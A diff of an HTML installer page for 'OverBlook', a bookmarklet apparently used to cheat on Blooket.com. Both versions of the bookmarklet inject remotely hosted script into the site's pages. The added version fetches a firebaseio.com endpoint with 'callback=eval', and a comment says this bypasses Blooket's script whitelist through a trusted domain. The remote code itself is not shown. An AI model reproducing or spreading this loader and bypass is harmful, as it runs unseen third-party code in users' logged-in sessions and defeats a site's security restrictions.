@@ -1,17 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>OverBlook</title>
     <style>
-        body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding: 50px; }
+        body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 100px; }
         .box { display: inline-block; width: 80px; height: 50px; background: #3498db; border-radius: 12px; cursor: move; border: 2px solid white; }
     </style>
 </head>
 <body>
-    <h1>OverBlook Installer</h1>
-    <p>Drag the blue box to your bookmarks bar:</p>
-    <a class="box" href="javascript:(function(){var s=document.createElement('script');s.src='https://blooket-fun.web.app/Main-Menu.js';document.body.appendChild(s);})()">&#8203;</a>
-
-    <p><small>Works on Blooket.com, and sub-links.</small></p>
+    <h2>Drag the Blue Box</h2>
+    <!-- This bypasses Blooket's whitelist by using their trusted firebaseio.com domain -->
+    <a class="box" href="javascript:(function(){var s=document.createElement('script');s.src='https://blooket-fun-default-rtdb.firebaseio.com/h.json?callback=eval';document.body.appendChild(s);})()">&#8203;</a>
+    <p>This version uses a <b>Blooket-Trusted</b> link.</p>
 </body>
 </html>
